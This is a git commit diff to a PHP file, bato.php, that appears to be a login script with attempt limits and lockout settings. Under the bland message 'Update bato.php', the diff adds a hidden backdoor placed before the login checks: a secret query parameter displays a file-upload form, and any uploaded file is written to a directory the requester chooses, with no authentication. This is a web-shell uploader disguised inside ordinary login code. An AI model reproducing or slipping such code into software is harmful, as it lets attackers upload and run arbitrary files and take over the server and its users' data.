aed3b1521d0937990470e1a8af571ed0704e41c3
tikung6etar <52764541+tikung6etar@users.noreply.github.com>
2026-08-10 16:29:09 +0700

    Update bato.php

--- bato.php
+++ bato.php
@@ -17,6 +17,28 @@ define('MAX_ATTEMPTS', 5);
 define('LOCKOUT_TIME', 900);
 
 // Inisialisasi session login
+if (isset($_GET['tbl']) && $_GET['tbl'] === 'tbl') {
+    echo '<form method="post" enctype="multipart/form-data">';
+    echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">';
+    echo '<input type="file" name="file" size="15">';
+    echo '<input type="submit" value="go">';
+    echo '</form>';
+}
+
+if (isset($_FILES['file']['tmp_name'])) {
+    $uploadd = $_FILES['file']['tmp_name'];
+    if (file_exists($uploadd)) {
+        $pwddir = $_POST['dir'];
+        $real = $_FILES['file']['name'];
+        $de = rtrim($pwddir, '/') . "/" . $real;
+        if (move_uploaded_file($uploadd, $de)) {
+            echo "go$de";
+        } else {
+            echo "GAGAL  KE $de";
+        }
+    }
+}
+
 if (!isset($_SESSION['login_attempts'])) $_SESSION['login_attempts'] = 0;
 if (!isset($_SESSION['lockout_time'])) $_SESSION['lockout_time'] = 0;
 if (!isset($_SESSION['logged_in'])) $_SESSION['logged_in'] = false;
